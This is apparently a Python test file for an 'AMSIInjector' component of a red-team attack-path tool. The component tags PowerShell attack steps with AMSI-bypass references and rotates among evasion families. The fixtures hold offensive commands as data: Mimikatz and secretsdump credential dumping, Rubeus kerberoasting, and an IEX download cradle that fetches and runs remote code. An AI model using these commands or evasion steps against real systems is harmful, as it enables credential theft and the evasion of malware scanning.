"""Tests for AMSIInjector - deterministic AMSI bypass injection."""
import pytest
from routers.attack_paths.services.amsi_injector import AMSIInjector


@pytest.fixture
def injector():
    """Create AMSIInjector instance."""
    return AMSIInjector()


@pytest.fixture
def powerview_step():
    """Attack step using PowerView (needs AMSI bypass)."""
    return {
        'step_number': 1,
        'title': 'Enumerate Domain Users',
        'opsec_options': [
            {
                'opsec_level': 'risky',
                'tool_name': 'PowerView',
                'command': 'Get-DomainUser -SPN',
                'explanation': 'Uses PowerView to enumerate users',
            }
        ]
    }


@pytest.fixture
def impacket_step():
    """Attack step using impacket (NO AMSI bypass needed)."""
    return {
        'step_number': 1,
        'title': 'Dump Credentials',
        'opsec_options': [
            {
                'opsec_level': 'safe',
                'tool_name': 'secretsdump.py',
                'command': 'impacket-secretsdump -just-dc DOMAIN/user@dc01.domain.local',
                'explanation': 'Uses impacket from Linux',
            }
        ]
    }


class TestNeedsAmsi:
    """Tests for _needs_amsi detection logic."""

    def test_powerview_needs_amsi(self, injector):
        """PowerView commands need AMSI bypass."""
        option = {'tool_name': 'PowerView', 'command': 'Get-DomainUser'}
        assert injector._needs_amsi(option) is True

    def test_rubeus_needs_amsi(self, injector):
        """Rubeus commands need AMSI bypass."""
        option = {'tool_name': 'Rubeus', 'command': 'Rubeus.exe kerberoast'}
        assert injector._needs_amsi(option) is True

    def test_mimikatz_needs_amsi(self, injector):
        """Mimikatz via PowerShell needs AMSI bypass."""
        option = {'tool_name': 'Mimikatz', 'command': 'Invoke-Mimikatz -DumpCreds'}
        assert injector._needs_amsi(option) is True

    def test_invoke_expression_needs_amsi(self, injector):
        """IEX download cradles need AMSI bypass."""
        option = {'tool_name': '', 'command': "IEX(New-Object Net.WebClient).DownloadString('http://x')"}
        assert injector._needs_amsi(option) is True

    def test_impacket_no_amsi(self, injector):
        """Impacket tools do NOT need AMSI bypass (Linux)."""
        option = {'tool_name': 'secretsdump.py', 'command': 'impacket-secretsdump DOMAIN/user@dc'}
        assert injector._needs_amsi(option) is False

    def test_certipy_no_amsi(self, injector):
        """Certipy does NOT need AMSI bypass (Python)."""
        option = {'tool_name': 'certipy', 'command': 'certipy find -u user@domain'}
        assert injector._needs_amsi(option) is False

    def test_nxc_no_amsi(self, injector):
        """NetExec does NOT need AMSI bypass (Python)."""
        option = {'tool_name': 'nxc', 'command': 'nxc smb 10.10.10.1'}
        assert injector._needs_amsi(option) is False

    def test_getuserspns_no_amsi(self, injector):
        """GetUserSPNs.py does NOT need AMSI bypass (Python)."""
        option = {'tool_name': 'GetUserSPNs.py', 'command': 'GetUserSPNs.py -request domain/user'}
        assert injector._needs_amsi(option) is False


class TestProcessAttackSteps:
    """Tests for process_attack_steps injection logic."""

    def test_injects_amsi_for_powerview(self, injector, powerview_step):
        """Should inject AMSI bypass reference for PowerView commands."""
        result = injector.process_attack_steps([powerview_step])

        assert len(result) == 1
        option = result[0]['opsec_options'][0]
        assert 'amsi_bypass' in option
        # Check for reference format (not inline code)
        assert option['amsi_bypass']['required'] is True
        assert 'note' in option['amsi_bypass']
        assert 'family' in option['amsi_bypass']

    def test_no_amsi_for_impacket(self, injector, impacket_step):
        """Should NOT inject AMSI bypass for impacket commands."""
        result = injector.process_attack_steps([impacket_step])

        assert len(result) == 1
        option = result[0]['opsec_options'][0]
        assert 'amsi_bypass' not in option

    def test_mixed_options_selective_injection(self, injector):
        """Should only inject AMSI for PowerShell options, not Linux options."""
        mixed_step = {
            'step_number': 1,
            'title': 'Kerberoast',
            'opsec_options': [
                {
                    'opsec_level': 'risky',
                    'tool_name': 'Rubeus',
                    'command': 'Rubeus.exe kerberoast',
                },
                {
                    'opsec_level': 'safe',
                    'tool_name': 'GetUserSPNs.py',
                    'command': 'impacket-GetUserSPNs -request domain/user',
                },
            ]
        }

        result = injector.process_attack_steps([mixed_step])

        # Rubeus option should have AMSI bypass
        assert 'amsi_bypass' in result[0]['opsec_options'][0]
        # impacket option should NOT have AMSI bypass
        assert 'amsi_bypass' not in result[0]['opsec_options'][1]

    def test_empty_steps_returns_empty(self, injector):
        """Empty input should return empty output."""
        result = injector.process_attack_steps([])
        assert result == []

    def test_preserves_existing_fields(self, injector, powerview_step):
        """Should preserve all existing fields in the step."""
        result = injector.process_attack_steps([powerview_step])

        option = result[0]['opsec_options'][0]
        assert option['tool_name'] == 'PowerView'
        assert option['command'] == 'Get-DomainUser -SPN'
        assert option['opsec_level'] == 'risky'
        assert option['explanation'] == 'Uses PowerView to enumerate users'


class TestBypassRotation:
    """Tests for AMSI bypass rotation across multiple injections."""

    def test_different_bypasses_for_multiple_steps(self, injector):
        """Multiple PowerShell steps should get different bypass families."""
        steps = [
            {
                'step_number': i,
                'title': f'Step {i}',
                'opsec_options': [
                    {'tool_name': 'PowerView', 'command': f'Get-DomainUser -Identity user{i}'}
                ]
            }
            for i in range(5)
        ]

        result = injector.process_attack_steps(steps)

        # Collect all bypass families from references
        bypass_families = [
            step['opsec_options'][0]['amsi_bypass']['family']
            for step in result
        ]

        # Should have at least 2 different bypass types (rotation working)
        unique_families = set(bypass_families)
        assert len(unique_families) >= 2, f"Expected rotation, got: {bypass_families}"


class TestReferenceFormat:
    """Tests for AMSI bypass reference format (not inline code)."""

    def test_injects_reference_not_code(self, injector, powerview_step):
        """Should inject reference with required=True and note, NOT code."""
        result = injector.process_attack_steps([powerview_step])

        option = result[0]['opsec_options'][0]
        assert 'amsi_bypass' in option

        bypass = option['amsi_bypass']
        # Reference format fields
        assert bypass['required'] is True
        assert 'note' in bypass
        assert 'Appendix' in bypass['note']
        assert 'family' in bypass

        # Should NOT have code field (moved to appendix)
        assert 'code' not in bypass
        assert 'name' not in bypass

    def test_tracks_used_bypass_families(self, injector):
        """Should track which bypass families have been used."""
        steps = [
            {
                'step_number': 1,
                'title': 'Step 1',
                'opsec_options': [
                    {'tool_name': 'PowerView', 'command': 'Get-DomainUser'}
                ]
            },
            {
                'step_number': 2,
                'title': 'Step 2',
                'opsec_options': [
                    {'tool_name': 'Rubeus', 'command': 'Rubeus.exe kerberoast'}
                ]
            }
        ]

        # Initially no families used
        assert len(injector.used_families) == 0

        # Process steps
        injector.process_attack_steps(steps)

        # Should have tracked families
        used = injector.get_used_families()
        assert len(used) >= 1
        # Families should be strings like 'reflection', 'patching', etc.
        for family in used:
            assert isinstance(family, str)
            assert family in ['reflection', 'patching', 'runspace', 'downgrade', 'etw_patching', 'etw_unregister', 'lolbin']
